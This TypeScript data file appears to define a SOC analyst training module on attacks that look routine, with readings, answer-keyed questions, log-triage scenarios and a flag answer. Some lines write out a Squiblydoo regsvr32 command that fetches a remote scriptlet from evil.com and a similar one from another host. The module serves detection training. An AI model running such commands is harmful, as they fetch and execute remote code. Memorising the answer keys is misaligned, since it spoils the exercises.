        "=============================================================\n" +
        "  MALICIOUS (Squiblydoo):\n" +
        "    regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll\n" +
        "    --> outbound network connection follows immediately\n" +
        "    --> DLL/script is remote, unsigned, never seen before\n\n" +
        "  LEGITIMATE (admin deployment):\n" +
        "    regsvr32.exe /s C:\\AppDeploy\\ReportEngine\\ReportViewerCtl.dll\n" +
        "    --> local file path, internally signed, version-controlled\n" +
        "    --> NO outbound network connection\n" +
        "    --> timestamp falls within an open change-management ticket\n\n" +
        "IMPOSSIBLE TRAVEL: REAL ATTACK vs VPN EGRESS HOP\n" +
        "=============================================================\n" +
        "  REAL ACCOUNT TAKEOVER:\n" +
        "    Login 1: Chicago, residential ISP ASN\n" +
        "    Login 2 (11 min later): Lagos, unrelated hosting-provider ASN\n" +
        "    is_proxy: false | as_org: unrelated / unknown\n\n" +
        "  VPN FALSE POSITIVE:\n" +
        "    Login 1: Chicago, residential/mobile ASN\n" +
        "    Login 2 (11 min later): Dublin, AS64500 (NexaCorp's own registered ASN)\n" +
        "    is_proxy: TRUE | as_org: 'NexaCorp Ltd - Corporate VPN Egress EMEA'\n" +
        "    network.vpn_gateway_pool: nexacorp-vpn-emea-dublin-01  <-- THE TELL\n\n" +
        "BUSINESS LOGIC: PASSWORD RESET ENUMERATION\n" +
        "=============================================================\n" +
        "  212 sequential POSTs to /forgot-password, 212 unique emails\n" +
        "  Every single request: HTTP 200, well-formed, zero WAF rule hits\n" +
        "  THE TELL: response_time_variance\n" +
        "    user_exists     -> ~812ms avg (password hash lookup + email send)\n" +
        "    user_not_exists -> ~94ms avg  (early return, no lookup)\n" +
        "  Variance itself leaks which of the 212 emails are valid accounts.",
      checkpoint: {
        question: "A workstation runs `regsvr32 /s /n /u /i:http://cdn-updates.net/x.sct scrobj.dll`, and an outbound connection follows immediately. According to the reading, what is this?",
        options: [
          "Squiblydoo (T1218.010): regsvr32 loading a remote scriptlet through scrobj.dll",
          "A routine local DLL registration, which is what the /i: switch with an http:// path performs",
          "Dependency confusion: the reading's name for regsvr32 fetching a script from an external host",
          "Business-logic abuse, the reading's category for signed Windows binaries used to download files",
        ],
        answer: 0,
        explanation: "The reading names this specific regsvr32/scrobj.dll remote-scriptlet technique 'Squiblydoo' (T1218.010), distinguishing it from a legitimate local DLL registration, which uses a local file path and makes no outbound connection.",
      },
    },

    // ── Question 1 ────────────────────────────────────────────────────────
    {
      type: "question" as const,
      id: "edge-q1",
      question:
        "Why does a dependency-confusion attack routinely bypass EDR tools that would normally flag suspicious child processes?",
      options: [
        "Because EDR sensors do not hook child-process creation for package managers such as npm and pip, so runtimes they spawn never reach the telemetry stream",
        "Because the code runs inside an expected lineage (npm or pip spawning node.exe or python.exe), so the tree looks routine and intent shows only in command line and destination",
        "Because the payload arrives over HTTPS from the public registry, and EDR cannot inspect encrypted package downloads, so the install step produces no alertable process activity",
        "Because the spawned runtime is vendor-signed (OpenJS Foundation or Python Software Foundation), and EDR reputation scoring suppresses alerts for any validly signed binary",
      ],
      answer: 1,
      explanation:
        "EDR baselines are heavily shaped by parent-child process legitimacy. npm.cmd spawning node.exe (or pip spawning python.exe) is extremely common developer activity, so the process tree alone carries a low suspicion score. The actual malicious signal is buried in what the spawned process does (an inline eval executing a download-and-run chain to a raw IP address) which requires inspecting command-line arguments and network destinations, not just the process ancestry.",
      xp: 20,
    },

    // ── Question 2 ────────────────────────────────────────────────────────
    {
      type: "question" as const,
      id: "edge-q2",
      question:
        "An OAuth consent-grant phishing attack succeeds without the attacker ever obtaining the victim's password and without triggering any MFA challenge on subsequent access. Why does MFA never fire for the attacker's ongoing access to the mailbox?",
      options: [
        "Because the phishing page captured the victim's TOTP seed, so the attacker can generate valid codes whenever the mailbox API requests a second factor",
        "Because the attacker replays the victim's browser session cookie from the consent step, and that cookie stays valid until the account password is next changed",
        "Because the token issued at consent becomes the credential for API access. Each call authenticates with the token itself, so no password or MFA challenge is presented",
        "Because the victim's MFA claim was satisfied at consent time and is cached for the life of the account, so every later sign-in from any app inherits it",
      ],
      answer: 2,
      explanation:
        "Once a user accepts an OAuth consent request, the identity provider issues a signed access/refresh token directly to the requesting application. That token, not a password, is what the attacker's app uses for every subsequent Microsoft Graph or Google Workspace API call. Because no further interactive login occurs, there is no event for MFA to intercept. This is what makes illicit consent grants so dangerous: they sidestep password- and MFA-based defenses entirely, and the only defensible checkpoint is the consent event itself.",
      xp: 25,
    },

    // ── Question 3 ────────────────────────────────────────────────────────
    {
      type: "question" as const,
      id: "edge-q3",
      question:
        "A password-reset endpoint returns HTTP 200 for every request regardless of whether the submitted email exists, and no single request is malformed. What makes this endpoint exploitable for account enumeration, and what is the correct detection layer to catch it?",
      options: [
        "Enumeration needs differing status codes or error text per case; with a uniform HTTP 200 there is no distinguishing signal, so the endpoint is not meaningfully exploitable",
        "Response-time variance between the 'user exists' and 'user does not exist' paths leaks validity; detect it with application-layer monitoring of timing and per-source request velocity",
        "Response body length differs slightly between the two paths; the right detection layer is a WAF managed signature for credential-stuffing patterns on the reset URL",
        "Unknown emails return 200 through a misconfigured redirect that exposes valid users; the right detection layer is a WAF rule blocking repeated POSTs once a source passes the rate limit",
      ],
      answer: 1,
      explanation:
        "Business-logic attacks like account enumeration exploit legitimate application behavior rather than a code flaw a WAF signature would catch. Here, the side channel is response-time variance: a real lookup-and-send-email path takes measurably longer than an early-return 'no such user' path. Detecting this requires monitoring at the business-transaction layer (velocity of distinct emails submitted per source IP, and timing variance across responses) because every individual HTTP request is syntactically and semantically valid.",
      xp: 25,
    },

    // ── Log Analysis 1: dependency-confusion process chain ─────────────────
    {
      type: "log_analysis" as const,
      id: "edge-la1",
      heading: "CrowdStrike Falcon: A Postinstall Script That Isn't What It Claims to Be",
      context:
        "A developer, d.wong, ran 'npm install internal-logging-utils' on their laptop while pulling in a new dependency for an internal tool. CrowdStrike Falcon generated a medium-confidence detection a few seconds later. At first glance this looks like routine developer tooling noise. Npm spawning node.exe happens constantly across your fleet. Look carefully at every field before deciding whether this is routine.",
      event: supplyChainEvent,
      questions: [
        {
          question:
            "node.exe running under npm during an install is normal. Which detail in this record shows that this particular node.exe run is NOT just the package's ordinary install step?",
          options: [
            "crowdstrike.FileSigned is true, which means the inline code must have been injected by tampering with node.exe itself",
            "The command differs from the declared postinstall (node ./scripts/setup.js) and chains exec into hidden PowerShell",
            "PatternDispositionDescription reads “Detection, No Action”, so Falcon has already judged the command to be benign",
            "The parent is npm.cmd rather than node.exe, which shows npm ran a script outside of its normal install lifecycle",
          ],
          answer: 1,
          explanation:
            "The package declares its postinstall as 'node ./scripts/setup.js' (npm.scripts.postinstall), but the process that actually ran is inline code that calls child_process.exec to launch hidden PowerShell and download-and-execute a script from a raw IP. The tell is the chain and the mismatch with what the package declares, not the use of node or of -e as such. “FileSigned is true” only says node.exe is the genuine signed runtime; the malicious logic is in the arguments it was given, not in a modified binary. “Detection, No Action” means Falcon detected and did not block. It is not a benign verdict. “The parent is npm.cmd” is the normal lineage for an install script, which is exactly why this attack blends in.",
          xp: 25,
        },
        {
          question:
            "Your internal registry serves internal-logging-utils at version 0.9.2. Compare that with the npm.registry and npm.package_version fields in this record. What does the combination point to?",
          options: [
            "Typosquatting: the name is a near-miss of a popular public package that the developer mistyped",
            "Dependency confusion: a same-named, higher-versioned public package beat the internal one",
            "A sanctioned public release: the team published this tool to npm, so public resolution is normal",
            "Registry DNS hijacking: the internal registry's name was redirected to the public npm registry",
          ],
          answer: 1,
          explanation:
            "The record shows the package came from https://registry.npmjs.org at version 1.0.4, while your internal registry serves the same name at 0.9.2. A public package with an internal-only name and a HIGHER version winning resolution is the dependency-confusion signature from Reading 1. “Typosquatting” needs a misspelled name; this is the exact internal name. “A sanctioned public release” would carry your own team's version line, not a version that jumps past the internal one, and a sanctioned release would not spawn hidden PowerShell. “Registry DNS hijacking” would show your internal registry's URL resolving somewhere else; here the record names the real public registry, which the build tool chose on its own.",
          xp: 25,
        },
        {
          question:
            "The download URL inside crowdstrike.CommandLine is a raw IP address (185.220.101.47) over plain HTTP, rather than a domain name over HTTPS. Why does this detail raise the priority of the detection?",
          options: [
            "Plain HTTP lets anyone on the path tamper with the download, so the main risk is a man-in-the-middle swap",
            "Package hosts serve named domains over HTTPS; a bare IP over HTTP for a second stage is cheap attacker infra",
            "It shows the TLS download failed and fell back to HTTP, which points to a broken proxy rather than an attack",
            "A raw IP cannot be caught by DNS blocking, so a firewall block is enough and the laptop needs no further review",
          ],
          answer: 1,
          explanation:
            "Legitimate package infrastructure (npm's CDN, GitHub releases, corporate update servers) is served over HTTPS from named domains. A bare IP over plain HTTP for a second-stage script is disposable attacker infrastructure: no domain to register, no certificate to manage, easy to rotate. That raises this from developer noise to a priority investigation. “A man-in-the-middle swap” worries about tampering with a download that is itself the malicious payload. “The TLS download failed and fell back to HTTP” is not supported by anything in the record: the command line hard-codes http:// from the start. “A firewall block is enough” ignores that the PowerShell stage may already have run; the laptop needs investigation regardless of blocking the IP.",
          xp: 20,
        },
      ],
    },

    // ── Log Analysis 2: OAuth consent grant to rogue app ────────────────────
    {
      type: "log_analysis" as const,
      id: "edge-la2",
      heading: "Azure AD: A Consent Grant That Never Touches a Password",
      context:
        "Azure AD Unified Audit Log recorded a routine-looking 'Consent to application' event for r.patel@nexacorp.com. No failed logins preceded it. No malware alert exists anywhere in the EDR console for this user's device. The event severity was auto-classified as medium by default policy. Walk through the raw fields to determine whether this deserves escalation.",
      event: oauthConsentEvent,
      questions: [
        {
          question:
            "The data.office365.ExtendedProperties.Value field lists the requested scopes as 'Mail.Read offline_access User.Read Contacts.Read' for an app called 'Quick Doc Viewer'. Which reading of this scope list best explains why the grant deserves escalation?",
          options: [
            "User.Read is the concern: it exposes the user's profile and job title to an outside publisher",
            "The scopes don't fit the app: a doc viewer reading mail and contacts, made persistent by offline_access",
            "offline_access alone is the concern; without it, Mail.Read for a viewer app would be routine",
            "Contacts.Read is the concern: it lets the app send mail as the user to their whole address book",
          ],
          answer: 1,
          explanation:
            "The strongest tell is the mismatch between scopes and purpose: a document viewer has no reason to read the user's mailbox and contacts, and offline_access is what turns that access into a persistent one, a refresh token lets the app keep minting access tokens without the user ever signing in again. “User.Read is the concern” picks the basic sign-in scope almost every app requests. “offline_access alone is the concern” over-weights one scope: many legitimate integrations (calendar sync, chat tools) request it, and Mail.Read on a viewer would be a mismatch with or without it. “Contacts.Read … lets the app send mail as the user” confuses read access with Mail.Send; Contacts.Read only reads the address book.",
          xp: 25,
        },
        {
          question:
            "The data.office365.ApplicationDisplayName is 'Quick Doc Viewer' and the GeoLocation fields show the consent occurred from Latvia. On their own, is either of these facts conclusive proof of a malicious app?",
          options: [
            "Yes: a generic name like this matches the attacker app names the reading describes, so the name settles it",
            "Yes: a consent from a country this user has never used shows the session itself was stolen from them",
            "No: each has innocent explanations; they matter alongside the scopes, publisher status and usual locations",
            "No, and even together they stay weak; without an EDR or malware alert there is nothing to escalate",
          ],
          answer: 2,
          explanation:
            "Neither signal is damning alone: plenty of legitimate apps have generic names, and travel or VPN egress produces foreign locations. The discipline is combining them: a generic, likely unverified app, requesting mail access plus a persistence scope, consented from a location atypical for this user, together moves the event from routine to investigate-now. “A generic name … settles it” treats a naming habit as proof; attackers pick names that sound legitimate precisely because legitimate apps sound like this. “A consent from a country this user has never used shows the session itself was stolen” leaps past the evidence: the reading's attack needs no stolen session, only a click on a real consent screen. “Without an EDR or malware alert there is nothing to escalate” is the exact assumption this room breaks: illicit consent grants involve no malware at all.",
          xp: 25,
        },
      ],
    },

    // ── Log Analysis 3: low-and-slow exfil trend ────────────────────────────
    {
      type: "log_analysis" as const,
      id: "edge-la3",
      heading: "SharePoint + UEBA: Fourteen Files a Day, Seventeen Days Running",
      context:
        "A single SharePoint FileDownloaded event for m.reyes shows 14 files pulled from the Contracts library. Your DLP policy's bulk-download threshold is 50 files per hour, so no rule fired and the event sits at low severity in the queue. A UEBA layer sitting on top of the same event stream has been quietly building a very different picture. Compare what each layer sees.",
      event: lowAndSlowEvent,
      questions: [
        {
          question:
            "The dlp.rule_triggered field is false and dlp.observed_files_this_hour (14) is far below dlp.threshold_files_per_hour (50). Why is it a mistake to close this alert as benign based on the DLP fields alone?",
          options: [
            "It is not a mistake: 14 of a 50-file limit is under 30% of the threshold, well inside normal daily use",
            "DLP judges one hour at a time, so it cannot see 17 sub-threshold days in a row: the insider pattern here",
            "The mistake is the threshold itself; lowering it to 10 files per hour would have made this session fire",
            "dlp.rule_triggered false means the policy never evaluated the event, so it must be re-scanned first",
          ],
          answer: 1,
          explanation:
            "DLP thresholds are a per-hour circuit breaker built to stop bulk exports; they cannot see a pattern spread across many days where each session stays under the line. The threshold not firing tells you this was not a smash-and-grab. It tells you nothing about 17 consecutive elevated days. “14 of a 50-file limit … well inside normal daily use” judges against the policy, not the person: this user's own baseline is 2-3 files a day. “Lowering it to 10 files per hour” is the fix the reading rejects: it just moves the goalpost, adds false positives, and a patient insider adjusts. “The policy never evaluated the event” misreads the record: dlp.policy_evaluated names the policy that ran; rule_triggered false means it ran and the count stayed under the threshold.",
          xp: 25,
        },
        {
          question:
            "The ueba.consecutive_days_elevated field shows 17, and ueba.library_role_relevance is marked LOW for this Finance-department user accessing the Contracts library. What is the correct analyst action given these two fields together?",
          options: [
            "Disable the account now: 17 elevated days in a row is enough to treat this as confirmed data theft",
            "Escalate: check what was taken and where it went, and bring in the manager and HR per the playbook",
            "Quietly reduce the user's SharePoint access so the downloads stop without tipping them off",
            "Raise a DLP tuning ticket so a daily-count rule catches this pattern next time, and close this alert",
          ],
          answer: 1,
          explanation:
            "Two independent risk factors reinforcing each other. Sustained deviation from personal baseline (17 consecutive elevated days) plus a library the UEBA layer rates as low relevance to this user's role. Is the combination that should trigger escalation. The next step is investigation: confirm what was accessed, check for any onward transfer (personal email, cloud storage, USB), and loop in the manager and HR per the insider-threat playbook, since context such as a role change or an approved project could still explain it. “Disable the account now” treats a strong pattern as proof and skips the context check. “Quietly reduce the user's SharePoint access” is a unilateral change outside the playbook that stops the evidence trail and can tip off the user just as surely. “Raise a DLP tuning ticket … and close this alert” improves future detection but abandons the 238 files that may already have left.",
          xp: 25,
        },
      ],
    },

    // ── Analyst Choice 1: VPN impossible-travel false positive ─────────────
    {
      type: "analyst_choice" as const,
      id: "edge-ac1",
      heading: "Verdict: Compromised Account or VPN Egress False Positive?",
      scenario:
        "Okta fires an impossible-travel alert for k.oconnell: a successful login from Chicago is followed eleven minutes later by a successful login from Dublin, Ireland, a physically impossible trip in that timeframe. The account has valid MFA on both sessions. Before escalating this as a probable account takeover, review the full event, particularly the network and security-context fields.",
      event: impossibleTravelFPEvent,
      correct_verdict: "false_positive",
      explanation:
        "This is a VPN/corporate-egress false positive, not an account takeover. The decisive fields are okta.securityContext.isProxy = true, okta.securityContext.asNumber/asOrg identifying AS64500 'NexaCorp Ltd - Corporate VPN Egress EMEA' (the organization's own registered VPN egress ASN, not a consumer VPN or an unrelated hosting provider), and network.vpn_gateway_pool explicitly naming 'nexacorp-vpn-emea-dublin-01': a company-owned VPN gateway. The user connected to the corporate VPN from Chicago, and their traffic legitimately egressed from the nearest regional gateway in Dublin. Both logins carry the same valid MFA-backed identity; there is no credential compromise signal anywhere in the event. The correct action is to close this as a false positive but verify the vpn_gateway_pool value against your organization's known-good VPN infrastructure inventory once, since an attacker could theoretically spoof or ride a similar-looking commercial VPN to hide in this exact blind spot.",
      fp_trap:
        "The alert title says 'impossible travel' and the raw geography genuinely IS impossible for a human traveler. It is tempting to treat the word 'impossible' as inherently high-severity and escalate immediately. But impossible travel detections were built before centralized VPN/SASE egress was common, and they systematically misfire whenever an organization routes remote traffic through geographically distant egress points. Always check is_proxy and the ASN/org name behind the IP before trusting the geography at face value: the raw distance-over-time math is only meaningful if both IPs represent the user's true physical location.",
      xp: 30,
    },

    // ── Analyst Choice 2: OAuth grant that looks benign but is malicious ────
    {
      type: "analyst_choice" as const,
      id: "edge-ac2",
      heading: "Verdict: Routine App Authorization or Illicit Consent Grant?",
      scenario:
        "Two weeks later, a different OAuth consent event appears in the queue: another user, another app. It is structurally identical to the routine app authorizations your users perform dozens of times a month (connecting Slack, Zoom, or a calendar tool to their Microsoft account). No malware alert exists and no failed logins precede it; the user's MFA was satisfied for their normal session, and every request went to legitimate login.microsoftonline.com endpoints. Your enrichment adds three facts: the app's Enterprise Applications entry shows its publisher as unverified, registered in an external tenant two days ago; j.alvarez works from the Madrid office and has no sign-in history outside Spain; and no ticket or request exists for a PDF-signing tool.",
      event: oauthConsentEvent2,
      correct_verdict: "true_positive",
      explanation:
        "Treat this as a true positive, a probable illicit consent grant, and remediate now, even though there is no malware, phishing infrastructure or credential theft. The scope list does not fit the app: a PDF signer has no need to read every file the user can reach (Files.Read.All) or their mailbox (Mail.Read), and offline_access makes that access persist through refresh tokens with no further user interaction. The surrounding facts remove the innocent explanations: an unverified publisher registered two days ago in an external tenant, a consent from Romania for a user with no sign-in history outside Spain, and no request for such a tool. Remediation: revoke the app's consent and remove it in Entra ID (Enterprise Applications), revoke the user's sessions and refresh tokens, and review what it reached while it held the token. MailItemsAccessed and file-access records with this app's ID, and Graph activity logs against its client ID.",
      fp_trap:
        "Because this event uses the exact same Operation name ('Consent to application.') and the exact same schema as the thousands of legitimate, benign SaaS-connection consents your users perform routinely, it is easy to pattern-match it to 'normal noise' and auto-close without reading the scope list. The trap is treating event TYPE as sufficient context: the same event type covers both a user connecting their calendar app and a user handing an attacker persistent mailbox access. You must read the actual requested scopes and app metadata every time, not just recognize the event name.",
      xp: 30,
    },

    // ── Analyst Choice 3: LOLBin regsvr32 that is actually legit admin work ─
    {
      type: "analyst_choice" as const,
      id: "edge-ac3",
      heading: "Verdict: Squiblydoo Attack or Legitimate Admin Deployment?",
      scenario:
        "EDR fires a medium-severity alert on SRV-APP-0044: regsvr32.exe registered a DLL outside the scheduled maintenance window. The technique maps to T1218.010 (System Binary Proxy Execution: Regsvr32), a documented Stealth technique (the tactic formerly called Defense Evasion). regsvr32 is a well-known LOLBin used in the Squiblydoo attack chain. Before escalating this as an intrusion, review every field in the event, not just the alert title.",
      event: lolbinEvent,
      correct_verdict: "false_positive",
      explanation:
        "This is legitimate administrative work, not Squiblydoo abuse. The command line registers a local file path (C:\\AppDeploy\\ReportEngine\\ReportViewerCtl.dll), not a remote scriptlet fetched over the network, and network.connection_made is false, meaning no outbound call followed execution at all, which is the single clearest technical distinction between real regsvr32/scrobj.dll abuse and routine local DLL registration. The file is signed, with file.publisher showing 'NexaCorp Internal Engineering': an internal, known publisher, not an unsigned or externally-sourced binary. The process was launched from a batch script (deploy_report_engine.bat) under an open change-management ticket, CHG0041823, and comparing change_management.actual_time (19:55:03Z) with the start of change_management.scheduled_window (20:00Z) shows the command ran only about 5 minutes before its approved window opened, not outside it in any meaningful sense, just an administrator starting slightly early. Every one of these facts is independently checkable in the raw event; none of them require trusting the analyst's gut. The correct action is to close this as a false positive, but log the 5-minute early-start deviation back to the change-management process as a minor process note, since consistently starting outside approved windows is worth flagging to the change board even when the activity itself is benign.",
      fp_trap:
        "regsvr32.exe is one of the most well-known LOLBins in the MITRE ATT&CK framework, and T1218.010 on an alert is exactly the kind of label that pushes a junior analyst straight to escalation without reading further. 'regsvr32 fired, technique matches a real attack technique, escalate now.' That instinct treats the BINARY as the signal, when the reading in this room already established that the signal is never which binary ran, it's what the binary was told to do and what happened immediately afterward. A local, signed, version-controlled DLL path with no outbound connection and a matching change ticket is the textbook legitimate use of the exact same tool attackers abuse. Same binary, same MITRE technique ID, completely different intent, and the raw fields prove it without requiring any assumption.",
      xp: 30,
    },

    // ── Analyst Choice 4: password-reset enumeration with no WAF hit ────────
    {
      type: "analyst_choice" as const,
      id: "edge-ac4",
      heading: "Verdict: Routine Password-Reset Traffic or Directory Enumeration?",
      scenario:
        "Cloudflare WAF logged 212 requests to the password-reset endpoint from a single source IP over a short window. cf.threat_score is a low 18, waf.rule_triggered is none, waf.observed_requests_per_min (42) sits well under the configured rate_limit_threshold_per_min (100), and every single request returned HTTP 200. Nothing here tripped a signature, and the traffic never exceeded the rate limit. Decide whether this deserves escalation.",
      event: passwordResetAbuseEvent,
      correct_verdict: "true_positive",
      explanation:
        "This is a true positive: a business-logic account-enumeration attack (T1589.002) that was specifically engineered to stay under every threshold-based control in front of it. The tell is not in any single request, since each one is individually well-formed and returns a normal-looking 200. It is in the pattern across the batch. app.unique_emails_attempted (212) submitted sequentially from one source, combined with app.response_time_variance_ms showing user_exists averaging 812ms against user_not_exists averaging 94ms, means the response timing itself leaks which of those 212 email addresses correspond to real accounts, regardless of the HTTP status code being identical across all of them. The user-agent (python-requests/2.31.0) confirms this traffic is scripted rather than a real user's browser. The low cf.threat_score and the absence of a triggered WAF rule are exactly what this room's reading predicted: signature and rate-based defenses were never designed to see a business-logic side channel, because no individual request is malformed or rate-abusive enough to cross their thresholds. The correct action is to escalate: block the source IP, alert the application owner to add response-time normalization (e.g., always perform a dummy hash lookup even on the not-found path) and a per-source velocity limit specifically on the reset endpoint's business outcome (not just raw request count), and check whether any of the accounts the timing marks as valid (the slow, ~812 ms responses) were subsequently targeted for credential stuffing or spray.",
      fp_trap:
        "A low threat_score, zero WAF rule hits, and a request rate under the configured limit reads, at a glance, like a fully clean event: three separate controls all said 'nothing to see here,' which makes it tempting to close this without ever opening the app.* fields. The trap is trusting network/WAF-layer verdicts for an attack that was never a network-layer attack in the first place. This room's reading was explicit that business-logic abuse exploits an application functioning exactly as designed, so the WAF, rate limiter, and bot score can all legitimately report 'normal' while the application's own response-timing side channel is actively leaking your user directory. The only place this attack is visible is in the business-outcome fields (unique emails attempted, response-time variance), never in the WAF verdict fields.",
      xp: 30,
    },

    // ── Matching ─────────────────────────────────────────────────────────
    {
      type: "matching" as const,
      id: "edge-m1",
      heading: "Match Each Edge-Case Attack to the Field or Signal That Actually Catches It",
      instructions:
        "Each of these attacks is specifically designed to look routine. Match the attack on the left to the single detection tell on the right that most reliably separates it from normal, benign activity.",
      pairs: [
        {
          id: "dep-confusion",
          left: "Dependency confusion (malicious npm/pip package)",
          right: "Package name matches an internal-only naming convention but resolves from the PUBLIC registry, combined with an inline-eval command spawning a network download",
        },
        {
          id: "insider-lowslow",
          left: "Insider low-and-slow data theft",
          right: "Sustained multi-week deviation from the user's personal download baseline, even though no single session crosses a DLP threshold",
        },
        {
          id: "magecart",
          left: "Magecart-style third-party script injection",
          right: "Unexpected new outbound POST destination from a checkout page, visible in Content-Security-Policy violation reports rather than server-side logs",
        },
        {
          id: "oauth-phish",
          left: "OAuth consent-grant phishing",
          right: "The requested scope list includes offline_access from a generic, unverified application: the earliest and cheapest point to detect the attack chain",
        },
        {
          id: "impossible-travel",
          left: "Impossible-travel false positive",
          right: "The second login's IP resolves to a known corporate VPN/proxy ASN and is_proxy is true, rather than an unrelated hosting or residential ASN",
        },
        {
          id: "lolbin",
          left: "LOLBin abuse (regsvr32/certutil)",
          right: "An outbound network connection immediately follows the binary's execution, and the target file/script is remote or unsigned rather than a local, version-controlled artifact",
        },
        {
          id: "bizlogic",
          left: "Password-reset / account enumeration",
          right: "Response-time variance between the 'account exists' and 'account does not exist' code paths, observed across many sequential requests from one source",
        },
      ],
      explanation:
        "Every edge case in this room shares the same structural trick: the individual event, viewed in isolation, is indistinguishable from something benign. What separates a true positive from noise is always a specific contextual field or a cross-event pattern, never the event type alone. Train yourself to ask 'what field would look different if this were the malicious version of this exact same event?' before triaging any of these categories.",
      xp: 35,
    },

    // ── Flag ─────────────────────────────────────────────────────────────
    {
      type: "flag" as const,
      id: "edge-f1",
      prompt:
        "Look at the LOLBin regsvr32 event. Exactly how many SECONDS before its approved change window opened did the DLL registration actually run? (Enter a number only.)",
      answer: "297",
      hint: "Both times you need are in the change-management fields of the raw event; the window has a start and an end, and only one of them matters here.",
      xp: 25,
    },

    // ── Reading 6: Wrap-up / analyst playbook for edge cases ───────────────
    {
      type: "reading" as const,
      id: "edge-r6",
      heading: "Building an Analyst Instinct for the Cases That Don't Look Like Attacks",
      content:
        "Every scenario in this room was chosen to break a specific, common analyst assumption. Supply-chain and dependency-confusion attacks break the assumption that 'a trusted parent process means trusted behavior.' Low-and-slow insider theft breaks the assumption that 'a threshold not being crossed means nothing to investigate.' Magecart and MSP compromise break the assumption that 'if my own logs are clean, my environment is clean': the compromise can live entirely in a third party you depend on but do not control. Shadow IT and OAuth consent phishing break the assumption that 'no malware and no credential theft means no incident'. Modern cloud attacks increasingly need neither. VPN-driven impossible-travel false positives break the assumption that 'geography math never lies'. Infrastructure can make two logins from one honest person look like two different people. LOLBins break the assumption that 'the tool used tells you the intent': the exact same binary, same command shape, is routine on Tuesday's change ticket and malicious on Wednesday's intrusion. Business-logic abuse breaks the assumption that 'well-formed requests are safe requests': an attacker doesn't need to break your application if your application's own designed behavior leaks the information they want.\n\n" +
        "The common thread across all seven cases is this: none of them can be reliably resolved by looking at a single event type or a single threshold. Each one requires either cross-referencing a secondary field (scope requested, ASN/proxy status, package registry source), or building a trend across many events (consecutive days of elevated activity, request velocity from one source, response-time variance across a batch), or reasoning about context the log itself does not explicitly encode (was there a change ticket, is this resource relevant to this user's role, is this app's function consistent with the permissions it is asking for).\n\n" +
        "A practical habit to carry forward: whenever you triage an alert that resolves quickly because it 'looks like normal noise,' pause and ask the specific question this room has repeated in every scenario. 'what would the malicious version of this exact same event look like, and which field would be different?' If you cannot answer that question, you have not actually ruled out the edge case; you have only pattern-matched against the common case. That one habit is what separates an analyst who catches these attacks from one who closes the ticket and moves on.",
      codeExample:
        "THE ONE QUESTION THAT CATCHES EVERY CASE IN THIS ROOM\n" +
        "=============================================================\n" +
        "  Before closing ANY alert as routine, ask:\n\n" +
        "  'What would the MALICIOUS version of this exact same event\n" +
        "   look like, and which single field would be different?'\n\n" +
        "  Supply chain:        registry source + inline-eval command line\n" +
        "  Insider low-and-slow: consecutive elevated days, not single session\n" +
        "  Magecart/MSP:         behavioral deviation within a trusted channel\n" +
        "  OAuth consent:        offline_access scope + publisher verification\n" +
        "  Impossible travel:    ASN/is_proxy behind the 'impossible' IP\n" +
        "  LOLBin:                outbound connection + file signing/versioning\n" +
        "  Business logic:        response-time variance + request velocity\n\n" +
        "  If you can't answer it, you haven't ruled out the edge case: \n" +
        "  you've only pattern-matched against the common case.",
    },
  ],
};

export default [edgeCaseRoom];
